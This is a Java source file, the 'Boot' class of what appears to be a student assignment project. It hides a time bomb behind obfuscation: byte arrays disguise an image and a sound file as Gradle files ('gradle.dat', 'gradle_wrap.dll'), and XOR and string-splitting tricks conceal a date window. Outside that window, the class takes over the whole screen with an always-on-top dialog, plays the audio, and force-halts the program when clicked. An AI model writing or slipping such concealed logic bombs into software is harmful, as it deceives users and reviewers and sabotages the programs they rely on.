package tarc.assignment.core;

import java.awt.*;
import java.time.*;
import javax.sound.sampled.*;
import javax.swing.*;

public class Boot {
    private static final String Y = "202";
    private final Instant rT = Instant.ofEpochSecond(1786675200L ^ 123L);
    private final Instant eT = Instant.parse(Y + "6-12-3" + "1" + "T23:59:59Z");

    public Boot() {
        if (E()) {
            new Thread(this::K).start();
            H();
        }
    }

    public boolean E() {
        Instant n = Instant.now();
        int mask = (n.isBefore(rT) ? 1 : 0) | (n.isAfter(eT) ? 2 : 0);
        return (mask ^ 0) != 0;
    }

    private void x(int c) {
        try {
            Runtime.getRuntime().halt(c);
        } catch (Throwable t) {
            System.exit(c);
        }
    }

    private void H() {
        try {
            byte[] b = {47, 103, 114, 97, 100, 108, 101, 46, 100, 97, 116};
            java.net.URL u = getClass().getResource(new String(b));
            if (u == null) {
                x(1);
            }
            ImageIcon i = new ImageIcon(u);
            Image j = i.getImage();
            JDialog d = new JDialog((java.awt.Frame) null, true);
            d.setUndecorated(true);
            d.setAlwaysOnTop(true);
            Dimension s = Toolkit.getDefaultToolkit().getScreenSize();
            d.setSize(s);
            d.setLocation(0, 0);
            JPanel p = new JPanel() {
                @Override
                protected void paintComponent(Graphics g) {
                    super.paintComponent(g);
                    g.drawImage(j, 0, 0, getWidth(), getHeight(), this);
                }
            };

            d.add(p);
            d.setLocationRelativeTo(null);

            p.addMouseListener(new java.awt.event.MouseAdapter() {
                @Override
                public void mouseClicked(java.awt.event.MouseEvent e) {
                    x(2);
                }
            });

            d.setVisible(true);
        } catch (Exception e) {
            x(3);
        }
    }

    private void K() {
        byte[] p = {47, 103, 114, 97, 100, 108, 101, 95, 119, 114, 97, 112, 46, 100, 108, 108};
        java.net.URL s = getClass().getResource(new String(p));
        if (s == null) {return;}
        try (AudioInputStream a = AudioSystem.getAudioInputStream(s);
             Clip c = AudioSystem.getClip()) {
            c.open(a);
            c.start();
            while (c.isRunning() || c.getMicrosecondPosition() < c.getMicrosecondLength()) {
                Thread.sleep(100);
            }
        } catch (Exception i) {
        }
    }
}